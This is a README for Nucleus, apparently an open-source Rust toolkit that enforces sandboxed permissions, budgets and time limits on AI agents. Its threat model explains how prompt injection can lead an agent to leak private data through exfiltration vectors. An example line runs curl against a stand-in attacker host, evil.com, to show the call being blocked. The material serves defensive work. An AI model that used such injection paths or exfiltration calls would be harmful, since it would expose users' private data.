# Nucleus

**Enforced permissions for AI agents** - policy + enforcement in one stack.

## The Problem

Most AI agent permission systems are **policy-only**: they define what SHOULD happen but don't enforce it. An agent (or malicious prompt injection) can simply ignore the policy checks.

```rust
// Policy-only approach - easily bypassed
if permissions.can_write_file(path) {
    std::fs::write(path, data)?;  // What if we just... skip the if?
}
```

## The Solution

Nucleus provides both **policy** (via lattice-guard) and **enforcement** (via nucleus):

```rust
// Enforcement approach - cannot bypass
let sandbox = Sandbox::new(&policy.paths, work_dir)?;
sandbox.write("file.txt", data)?;  // Enforced by capability handle

// There is no sandbox.write_unchecked() - enforcement is the only path
```

## Components

| Crate | Purpose | Key Feature |
|-------|---------|-------------|
| **lattice-guard** | Policy definition | Quotient lattice, trifecta detection |
| **nucleus** | Policy enforcement | cap-std sandbox, atomic budget, monotonic time |
| **nucleus-cli** | CLI tool | Run agents with enforced permissions |

## Quick Start

```bash
# Install the CLI
cargo install nucleus-cli

# Run a task with enforced permissions
nucleus run --profile fix-issue "Fix the bug in src/main.rs"

# List available permission profiles
nucleus profiles
```

## The Lethal Trifecta

The core security model prevents the [lethal trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/):

1. **Private Data Access** (reading files, secrets)
2. **Untrusted Content** (web fetch, external input)
3. **Exfiltration Vector** (git push, curl, PRs)

When all three are present at autonomous levels, prompt injection can exfiltrate data.

**Nucleus enforces this at runtime** - not just as a policy check:

```rust
// Even if policy allows curl, nucleus blocks it when trifecta would complete
let executor = Executor::new(&policy, &sandbox, &budget);
executor.run("curl http://evil.com")?;
// Error: TrifectaBlocked { operation: "curl http://evil.com" }
```

## Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                        Your Agent                                │
├─────────────────────────────────────────────────────────────────┤
│                       nucleus-cli                                │
│              (CLI with interactive approval)                     │
├─────────────────────────────────────────────────────────────────┤
│                         nucleus                                  │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────────────┐  │
│  │   Sandbox    │  │   Executor   │  │   AtomicBudget       │  │
│  │  (cap-std)   │  │  (process)   │  │   (lock-free)        │  │
│  └──────────────┘  └──────────────┘  └──────────────────────┘  │
├─────────────────────────────────────────────────────────────────┤
│                      lattice-guard                               │
│  (PermissionLattice, PathLattice, CommandLattice, BudgetLattice)│
├─────────────────────────────────────────────────────────────────┤
│                    Operating System                              │
│           (cap-std capabilities, atomic ops, quanta)             │
└─────────────────────────────────────────────────────────────────┘
```

## Why This Approach?

### vs. Policy-Only Libraries

| Aspect | Policy-Only | Nucleus |
|--------|-------------|---------|
| File access | `can_access()` → bool | `Sandbox::open()` → File |
| Bypass | Ignore the bool | No bypass path exists |
| Concurrent budget | Race conditions | Atomic CAS |
| Time enforcement | Wall clock | Monotonic (quanta) |

### vs. Container Sandboxing

| Aspect | Containers | Nucleus |
|--------|------------|---------|
| Granularity | Process-level | Operation-level |
| Trifecta | Not aware | First-class concept |
| Budget tracking | External | Integrated |
| Human approval | External | `AskFirst` callback |

**Best practice**: Use both! Nucleus for fine-grained agent control, containers for defense-in-depth.

## Permission Profiles

```bash
# List all profiles
nucleus profiles

# Available profiles:
#   read-only      File reading and search only
#   code-review    Read + limited web search
#   fix-issue      Write + bash + git commit (no push/PR)
#   full           Everything (trifecta still enforced!)
#   restrictive    Minimal permissions (default)
```

## Custom Permissions

Create a `permissions.toml`:

```toml
[capabilities]
read_files = "always"
write_files = "low_risk"
edit_files = "low_risk"
run_bash = "ask_first"    # Requires approval callback
git_commit = "low_risk"
git_push = "never"        # Blocked entirely
web_fetch = "never"       # No untrusted content

[budget]
max_cost_usd = 2.0
max_input_tokens = 50000
max_output_tokens = 5000

[time]
valid_hours = 1           # Expires after 1 hour
```

```bash
nucleus run --config permissions.toml "Your task here"
```

## Security Model

### What We Enforce

- ✅ File access via capability handles (symlink-safe)
- ✅ Command execution validated before spawning
- ✅ Budget tracked atomically (no concurrent races)
- ✅ Time bounds via monotonic clock (manipulation-proof)
- ✅ Trifecta blocked at runtime (not just policy)
- ✅ AskFirst requires actual callback

### What We Don't Enforce

- ❌ Kernel-level escapes (use containers)
- ❌ Network-level exfiltration if bash allowed
- ❌ Human approving bad actions (social engineering)
- ❌ Side-channel attacks

## Development

```bash
# Build all crates
cargo build --workspace

# Run tests
cargo test --workspace

# Run CLI in development
cargo run -p nucleus-cli -- run --profile fix-issue "Test task"
```

## License

Licensed under either of Apache License, Version 2.0 or MIT license at your option.

## References

- [The Lethal Trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/) - Simon Willison
- [Container Hardening Against Agentic AI](https://securitytheatre.substack.com/p/container-hardening-against-agentic)
- [cap-std](https://github.com/bytecodealliance/cap-std) - Capability-based filesystem
